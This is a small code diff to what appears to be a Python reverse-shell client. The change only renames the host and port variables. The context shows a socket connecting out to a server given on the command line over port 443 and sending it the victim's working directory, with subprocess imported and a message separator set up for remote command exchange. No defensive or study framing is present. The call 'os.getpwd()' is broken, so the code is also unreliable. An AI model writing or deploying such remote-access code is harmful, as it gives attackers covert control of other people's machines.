@@ -3,8 +3,8 @@ import os
 import subprocess
 import sys
 
-SERVER_HOST = sys.argv[1]
-SERVER_PORT = 443
+Host = sys.argv[1]
+Port = 443
 BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
 # separator string for sending 2 messages in one go
 SEPARATOR = "<sep>"
@@ -12,7 +12,7 @@ SEPARATOR = "<sep>"
 # create the socket object
 s = socket.socket()
 # connect to the server
-s.connect((SERVER_HOST, SERVER_PORT))
+s.connect((Host, Port))
 
 pwd = os.getpwd()
 s.send(pwd.encode())
